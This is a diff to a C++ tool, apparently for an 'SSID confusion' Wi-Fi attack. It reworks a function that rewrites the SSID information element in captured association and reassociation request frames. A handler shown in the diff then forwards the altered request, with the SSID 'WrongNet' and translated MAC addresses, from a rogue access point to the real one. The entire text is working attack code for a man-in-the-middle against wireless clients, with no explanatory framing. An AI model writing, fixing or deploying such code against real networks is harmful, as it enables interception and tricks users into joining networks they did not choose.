@@ -79,27 +79,28 @@ FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr1, const H
 
 
 void rewrite_ssid_in_frame(vector<uint8_t> &raw, const string &new_ssid) {
-	// SSID option in 802.11 Management frame
-	// SSID element ID = 0
-	uint8_t* ptr = raw.data();
-
-	// RadioTap + 802.11 header
+	if(raw.size() < 6) return;
 	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (raw[3] << 8);
-	uint8_t* options = ptr + rt_len;  // Začátek IEs
 
-	while(options + 2 < raw.data() + raw.size()) {
-		uint8_t element_id = options[0];
-		uint8_t len = options[1];
+	// 802.11 mgmt header = 24 B; AssocReq fixed = 4 B, ReassocReq fixed = 10 B
+	const uint8_t subtype = (raw[rt_len] >> 4) & 0x0F;
+	const size_t fixed = (subtype == 2) ? 10 : 4;
+	const size_t ie_start = rt_len + 24 + fixed;
 
-		if(element_id == 0 && len <= 32) {  // SSID Element
-			memset(options + 2, 0, len);  // clean old
-			memcpy(options + 2, new_ssid.c_str(),
-				   min(new_ssid.size(), static_cast<size_t>(len)));
+	if(raw.size() < ie_start + 2) return;
+
+	for(size_t i = ie_start; i + 1 < raw.size(); ) {
+		if(raw[i] == 0) {  // SSID IE
+			const size_t old_len = raw[i + 1];
+			const size_t new_len = min(new_ssid.size(), (size_t)32);
+			raw.erase(raw.begin() + i + 2, raw.begin() + i + 2 + old_len);
+			raw.insert(raw.begin() + i + 2,
+				reinterpret_cast<const uint8_t*>(new_ssid.data()),
+				reinterpret_cast<const uint8_t*>(new_ssid.data()) + new_len);
+			raw[i + 1] = static_cast<uint8_t>(new_len);
 			return;
 		}
-
-		// other element
-		options += 2 + len;
+		i += 2 + raw[i + 1];
 	}
 }
 
@@ -137,7 +138,7 @@ FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot1
 	display_traffic(dot11, "Rogue channel", " -- Replied");
 
 	auto translated = raw;
-	rewrite_ssid_in_frame(translated, "WrongNet");  // ← PŘEPIS
+	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
 	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac));
 
 	log(LogLevel::DEBUG, "Forwarding Assoc to Real AP with WrongNet SSID");
